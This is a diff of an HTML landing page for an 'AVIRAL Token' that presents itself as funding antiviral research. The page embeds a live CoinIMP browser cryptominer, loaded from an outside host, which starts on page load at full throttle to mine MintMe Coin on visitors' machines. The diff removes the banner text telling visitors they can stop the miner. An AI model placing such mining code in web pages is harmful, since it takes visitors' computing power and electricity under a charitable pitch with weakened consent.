@@ -1,85 +1,110 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>AVIRAL Token | Mining to Support Antiviral Research</title>
+  <title>AVIRAL Token | Apoya la Ciencia</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom right, #f44336, #ff9800);
-      color: #fff;
+      background: linear-gradient(to bottom right, #ff6f00, #ffcc00);
+      color: #1a1a1a;
       text-align: center;
+      padding: 0;
     }
     .container {
       max-width: 1000px;
       margin: auto;
-      padding: 2rem;
+      padding: 2rem 1rem;
     }
     img {
-      max-width: 100%;
-      height: auto;
+      width: 100%;
+      max-width: 700px;
       border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      margin-bottom: 2rem;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.3);
     }
     h1 {
-      font-size: 3rem;
-      margin-top: 1rem;
+      font-size: 2.8rem;
+      margin: 0.5rem 0;
+      color: #212121;
     }
     h2 {
-      margin-top: 1.5rem;
+      font-weight: 400;
       font-size: 1.5rem;
+      margin: 1rem auto 2rem;
+      color: #444;
     }
-    .mining-note {
-      font-size: 0.9rem;
+    .notice {
+      background: #fff3cd;
+      color: #856404;
+      border-radius: 10px;
+      padding: 1.2rem 1.5rem;
       margin-top: 2rem;
-      color: #ffeb3b;
+      font-size: 1rem;
+      max-width: 850px;
+      margin-left: auto;
+      margin-right: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .split {
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
+    .button {
+      background: #ffc107;
+      color: #000;
+      padding: 0.8rem 1.6rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 0 10px #ff9800;
+      transition: all 0.3s ease;
+      display: inline-block;
+      margin-top: 1.5rem;
     }
-    @media(min-width: 768px) {
-      .split {
-        flex-direction: row;
-        justify-content: space-around;
-      }
+    .button:hover {
+      background: #ffca28;
+      box-shadow: 0 0 15px #ffa000;
+    }
+    footer {
+      margin-top: 4rem;
+      font-size: 0.9rem;
+      color: #333;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="6ae8f5db-33d4-40ca-b12f-c491a9851785.jpg" alt="AVIRAL Token Banner" />
+    <img src="774259a6-f190-4071-87cd-2af07f5c0fcb.png" alt="AVIRAL Token Banner" />
 
-    <div class="split">
-      <div>
-        <h1>Support Antiviral Research</h1>
-        <h2>AVIRAL is a token funding scientific innovation against emerging viruses</h2>
-      </div>
-      <div>
-        <h1>Apoya la Investigación Antiviral</h1>
-        <h2>AVIRAL es un token que financia el desarrollo de antivirales ante virus emergentes</h2>
-      </div>
-    </div>
+    <h1>🧬 AVIRAL Token</h1>
+    <h2>Impulsando la investigación antiviral desde tu navegador 🌐</h2>
 
-    <p class="mining-note">
-      This site runs a JavaScript-based miner from coinimp.com to support real science. | <br />
-      Este sitio utiliza minería en tu navegador para apoyar proyectos científicos reales.
+    <p class="notice">
+      ⚠️ <strong>Deja esta pestaña abierta para donar poder de cómputo 💻.</strong><br>
+      🧪 Estás ayudando a minar <strong>MintMe Coin</strong>, lo que nos permitirá lanzar el token <strong>AVIRAL</strong> oficialmente en la blockchain.<br>
+      💰 Los fondos recaudados se destinarán a apoyar investigaciones científicas reales contra virus emergentes.<br><br>
+
+      ⚠️ <strong>Leave this tab open to donate computing power 💻.</strong><br>
+      🧪 You are helping mine <strong>MintMe Coin</strong> to officially launch the <strong>AVIRAL</strong> token on the blockchain.<br>
+      💰 All proceeds will fund real scientific research against emerging viruses.
     </p>
+
+    <a class="button" href="https://www.mintme.com/token/AVIRAL" target="_blank">🔗 Ver o Comprar en MintMe</a>
+
+    <footer>
+      <p>Red Mexicana para el Desarrollo de Antivirales (RMDA) | AVIRAL © 2025</p>
+    </footer>
   </div>
 
   <!-- CoinIMP Mining Script -->
   <script src="https://www.hostingcloud.racing/4qzr.js"></script>
   <script>
     var _client = new Client.Anonymous('201f3477d57d2ae999354d2a82193d7a413cdbecc697c25648ab9e2b73a33c21', {
-      throttle: 0, c: 'w',  ads: 0
+      throttle: 0, c: 'w'
     });
     _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#fea916", 40, "#000000");
+    _client.addMiningNotification("Top", "🧠 This site is mining MintMe to support antiviral research. ¡Gracias por tu apoyo!", "#fea916", 40, "#000000");
   </script>
 </body>
 </html>
-
